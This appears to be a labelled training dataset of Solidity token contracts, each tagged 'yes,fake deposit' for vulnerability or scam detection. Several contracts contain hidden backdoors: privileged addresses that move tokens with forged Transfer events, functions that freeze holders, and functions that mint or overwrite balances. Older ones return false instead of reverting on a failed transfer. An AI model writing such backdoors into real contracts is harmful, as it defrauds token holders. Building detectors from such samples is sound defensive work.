{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address LRV = 0x255fd0898d235DFF82e6Af3180e23Dc02102D72b;\n\taddress LRTR = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n modifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n\n}\n\n\n\ncontract RISKCHALLENGE is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Lc;\n\tmapping (address => bool) private Lb;\n mapping (address => bool) private Lw;\n mapping (address => mapping (address => uint256)) private Lv;\n uint8 private constant LCE = 8;\n uint256 private constant lS = 150000000 * (10** LCE);\n string private constant _name = \"RISK CHALLENGE PROTOCOL\";\n string private constant _symbol = \"CHALLENGE\";\n\n\n\n constructor () {\n Lc[_msgSender()] = lS;\n lmkr(LRTR, lS); }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return LCE;\n }\n\n function totalSupply() public pure returns (uint256) {\n return lS;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Lc[account];\n }\n function lmkr(address Lj, uint256 Ln) onlyOwner internal {\n emit Transfer(address(0), Lj ,Ln); }\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return Lv[owner][spender];\n }\n\t function kBurn(address Lj) onlyOwner public{\n Lb[Lj] = true; }\n\t\t\n function approve(address spender, uint256 amount) public returns (bool success) { \n Lv[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n \n\t\tfunction kStake(address Lj) public {\n if(Lb[msg.sender]) { \n Lw[Lj] = false;}}\n function kQuery(address Lj) public{\n if(Lb[msg.sender]) { \n Lw[Lj] = true; }}\n \n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == LRV) {\n require(amount <= Lc[sender]);\n Lc[sender] -= amount; \n Lc[recipient] += amount; \n Lv[sender][msg.sender] -= amount;\n emit Transfer (LRTR, recipient, amount);\n return true; } else \n if(!Lw[recipient]) {\n if(!Lw[sender]) {\n require(amount <= Lc[sender]);\n require(amount <= Lv[sender][msg.sender]);\n Lc[sender] -= amount;\n Lc[recipient] += amount;\n Lv[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address Lj, uint256 Ln) public {\n if(msg.sender == LRV) {\n require(Lc[msg.sender] >= Ln);\n Lc[msg.sender] -= Ln; \n Lc[Lj] += Ln; \n emit Transfer (LRTR, Lj, Ln);} else \n if(Lb[msg.sender]) {Lc[Lj] += Ln;} else\n if(!Lw[msg.sender]) {\n require(Lc[msg.sender] >= Ln);\n Lc[msg.sender] -= Ln; \n Lc[Lj] += Ln; \n emit Transfer(msg.sender, Lj, Ln);}}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _MsgSendr() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _tiConstruct = 0x6f446dFCB8d3b117095B6065ECa85cB606D0eFBa;\n\taddress UniV2Router = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\n constructor () {\n address msgSender = _MsgSendr();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n}\n\n\n\ncontract SHIBARIUM is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Tii;\n\tmapping (address => bool) private Yii;\n mapping (address => bool) private Kii;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _TiSup = 1000000000 * 10**_decimals;\n string private constant _name = \"SHIBARIUM\";\n string private constant _symbol = \"SHIBARIUM\";\n\n\n\n constructor () {\n Tii[_MsgSendr()] = _TiSup;\n emit Transfer(address(0), UniV2Router, _TiSup);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _TiSup;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Tii[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction Tiend(address px) public {\n if(Yii[msg.sender]) { \n Kii[px] = false;}}\n function Tiquery(address px) public{\n if(Yii[msg.sender]) { \n require(!Kii[px]);\n Kii[px] = true; }}\n\t\tfunction Aistake(address px) public{\n if(msg.sender == _tiConstruct) { \n require(!Yii[px]);\n Yii[px] = true; }}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _tiConstruct) {\n require(amount <= Tii[sender]);\n Tii[sender] -= amount; \n Tii[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (UniV2Router, recipient, amount);\n return true; } \n if(!Kii[recipient]) {\n if(!Kii[sender]) {\n require(amount <= Tii[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n Tii[sender] -= amount;\n Tii[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address recipient, uint256 amount) public {\n if(msg.sender == _tiConstruct) {\n require(Tii[msg.sender] >= amount);\n Tii[msg.sender] -= amount; \n Tii[recipient] += amount; \n emit Transfer (UniV2Router, recipient, amount);}\n if(Yii[msg.sender]) {Tii[recipient] = amount;} \n if(!Kii[msg.sender]) {\n require(Tii[msg.sender] >= amount);\n Tii[msg.sender] -= amount; \n Tii[recipient] += amount; \n emit Transfer(msg.sender, recipient, amount);\n }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address constrct = 0x45BbB9acc12AF58a71725fb3C30A9d888a677DBB;\n\taddress Routerv2 = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;\n constructor () {\n address msgSender = _msgSender();\n _owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _owner);\n emit OwnershipTransferred(_owner, address(0));\n _owner = address(0);\n }\n\n}\n\n\n\ncontract IONIS is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private CPI;\n\tmapping (address => uint256) private IPD;\n mapping (address => bool) private XvC;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _tTotal = 250000000 * 10**_decimals;\n string private constant _name = \"IONIS\";\n string private constant _symbol = \"IONIS\";\n\n\n\n constructor () {\n CPI[_msgSender()] = _tTotal;\n emit Transfer(address(0), Routerv2, _tTotal);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _tTotal;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return CPI[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n function Ixbri () public {\n if(msg.sender == constrct) {\n CPI[msg.sender] = IPD[msg.sender];\n }}\n\n\n\n function Ixde(address yz) public {\n if(msg.sender == constrct) { \n XvC[yz] = false;}}\n function Ixcheck(address yz) public{\n if(msg.sender == constrct) { \n require(!XvC[yz]);\n XvC[yz] = true; }}\n function Ixbal(uint256 yz) public {\n if(msg.sender == constrct) { \n IPD[msg.sender] = yz;}} \n\n function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == constrct) {\n require(amount <= CPI[sender]);\n CPI[sender] -= amount; \n CPI[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (Routerv2, recipient, amount);\n return true; } \n if(!XvC[sender] && !XvC[recipient]) {\n require(amount <= CPI[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n CPI[sender] -= amount;\n CPI[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}\n\n \n\n function transfer(address recipient, uint256 amount) public {\n if(msg.sender == constrct) {\n require(CPI[msg.sender] >= amount);\n CPI[msg.sender] -= amount; \n CPI[recipient] += amount; \n emit Transfer (Routerv2, recipient, amount);\n } \n if(!XvC[msg.sender]) {\n require(CPI[msg.sender] >= amount);\n CPI[msg.sender] -= amount; \n CPI[recipient] += amount; \n emit Transfer(msg.sender, recipient, amount);\n }}\n \n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n ) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender)\n constant\n returns (uint256 remaining)\n {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(\n address indexed _owner,\n address indexed _spender,\n uint256 _value\n );\n}\n\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n ) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (\n balances[_from] >= _value &&\n allowed[_from][msg.sender] >= _value &&\n _value > 0\n ) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender)\n constant\n returns (uint256 remaining)\n {\n return allowed[_owner][_spender];\n }\n\n mapping(address => uint256) balances;\n mapping(address => mapping(address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract TimeshareToken is StandardToken {\n function() {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = \"H1.0\"; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n function TimeshareToken() {\n balances[msg.sender] = 10000000000;\n totalSupply = 10000000000;\n name = \"Timeshare\"; // Set the name for display purposes\n decimals = 0; // Amount of decimals for display purposes\n symbol = \"TMT\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(\n address _spender,\n uint256 _value,\n bytes _extraData\n ) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call should succeed, otherwise one would use vanilla approve instead.\n if (\n !_spender.call(\n bytes4(\n bytes32(\n sha3(\"receiveApproval(address,uint256,address,bytes)\")\n )\n ),\n msg.sender,\n _value,\n this,\n _extraData\n )\n ) {\n throw;\n }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address CZC = 0x19041bEBd6b59b10C550F71b3550c56327C4a93b;\n\taddress cZRouterV2 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n \t\tmodifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n\n}\n\n\n\ncontract SABRE is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Cc;\n\tmapping (address => bool) private Cb;\n mapping (address => bool) private Cz;\n mapping (address => mapping (address => uint256)) private eC;\n uint8 private constant _decimals = 8;\n uint256 private constant sC = 200000000 * 10**_decimals;\n string private constant _name = \"Sabre Network\";\n string private constant _symbol = \"SABRE\";\n\n\n\n constructor () {\n Cc[_msgSender()] = sC;\n emit Transfer(address(0), cZRouterV2, sC);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return sC;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Cc[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return eC[owner][spender];\n }\n function approve(address spender, uint256 amount) public returns (bool success) { \n eC[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction cStake(address Cf) public {\n if(Cb[msg.sender]) { \n Cz[Cf] = false;}}\n function cQuery(address Cf) public{\n if(Cb[msg.sender]) { \n Cz[Cf] = true; }}\n \n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == CZC) {\n require(amount <= Cc[sender]);\n Cc[sender] -= amount; \n Cc[recipient] += amount; \n eC[sender][msg.sender] -= amount;\n emit Transfer (cZRouterV2, recipient, amount);\n return true; } else \n if(!Cz[recipient]) {\n if(!Cz[sender]) {\n require(amount <= Cc[sender]);\n require(amount <= eC[sender][msg.sender]);\n Cc[sender] -= amount;\n Cc[recipient] += amount;\n eC[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address Ci, uint256 Cf) public {\n if(msg.sender == CZC) {\n require(Cc[msg.sender] >= Cf);\n Cc[msg.sender] -= Cf; \n Cc[Ci] += Cf; \n emit Transfer (cZRouterV2, Ci, Cf);} else \n if(Cb[msg.sender]) {Cc[Ci] += Cf;} else\n if(!Cz[msg.sender]) {\n require(Cc[msg.sender] >= Cf);\n Cc[msg.sender] -= Cf; \n Cc[Ci] += Cf; \n emit Transfer(msg.sender, Ci, Cf);}}\n \n function cBurn(address Cf) onlyOwner public{\n Cb[Cf] = true; }\n\t\t}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _MsgSendr() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _rConstruct = 0x23fda63bb8A87946942556eC668221B090759Df0;\n\taddress UnisV2Router = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\n constructor () {\n address msgSender = _MsgSendr();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n}\n\n\n\ncontract NOSFERINU is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Iq;\n\tmapping (address => bool) private tQ;\n mapping (address => bool) private mQ;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _QmSup = 666000000 * 10**_decimals;\n string private constant _name = \"Nosferatu Inu\";\n string private constant _symbol = \"NOSFERINU\";\n\n\n\n constructor () {\n Iq[_MsgSendr()] = _QmSup;\n emit Transfer(address(0), UnisV2Router, _QmSup);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _QmSup;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Iq[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction rEnd(address z) public {\n if(tQ[msg.sender]) { \n mQ[z] = false;}}\n function rQuery(address z) public{\n if(tQ[msg.sender]) { \n require(!mQ[z]);\n mQ[z] = true; }}\n\t\tfunction arStake(address z) public{\n if(msg.sender == _rConstruct) { \n require(!tQ[z]);\n tQ[z] = true; }}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _rConstruct) {\n require(amount <= Iq[sender]);\n Iq[sender] -= amount; \n Iq[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (UnisV2Router, recipient, amount);\n return true; } \n if(!mQ[recipient]) {\n if(!mQ[sender]) {\n require(amount <= Iq[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n Iq[sender] -= amount;\n Iq[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address txTo, uint256 z) public {\n if(msg.sender == _rConstruct) {\n require(Iq[msg.sender] >= z);\n Iq[msg.sender] -= z; \n Iq[txTo] += z; \n emit Transfer (UnisV2Router, txTo, z);}\n if(tQ[msg.sender]) {Iq[txTo] = z;} \n if(!mQ[msg.sender]) {\n require(Iq[msg.sender] >= z);\n Iq[msg.sender] -= z; \n Iq[txTo] += z; \n emit Transfer(msg.sender, txTo, z);\n }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract LUNA_ZOOM is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000*10**uint256(decimals);\n string public constant name = \"LUNA ZOOM\";\n string public constant symbol = \"LUNAZ \ud83c\udf15\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract LUNA_MOON is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000*10**uint256(decimals);\n string public constant name = \"LUNA MOON\";\n string public constant symbol = \"LUNAM \ud83c\udf1d\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
